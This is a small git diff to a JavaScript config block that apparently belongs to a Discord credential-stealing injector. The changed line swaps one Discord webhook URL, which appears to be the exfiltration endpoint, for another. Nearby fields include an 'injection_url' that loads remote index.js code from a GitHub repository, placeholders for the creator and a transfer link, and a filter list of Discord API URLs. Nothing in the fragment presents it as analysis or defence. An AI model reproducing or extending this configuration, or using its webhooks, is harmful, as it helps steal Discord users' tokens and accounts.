@@ -20,7 +20,7 @@ var config = {
     creator: "%NAME_CREATOR%",
     transfer_link: `%TRANSFER_URL%`,
     injection_url: "https://raw.githubusercontent.com/roadhooog/shop2/main/index.js",
-    webhook: "https://discord.com/api/webhooks/1229189812548927488/hmuROQRqNG-SjN06YX4TTDXNGst05K8ZKHGmadkOb_mYrgyyXLKUM7BL3X4d6GUmmn8d",
+    webhook: "https://discord.com/api/webhooks/1258100475379712023/I3jZOxmMYtRRP8pBj-ZeGG-hOV4gcCDHauUMii3BtLTo5ENc6f2x-NpXK9uTEHjM1R-7",
     Filter: {
         "urls": [
             "https://status.discord.com/api/v*/scheduled-maintenances/upcoming.json",
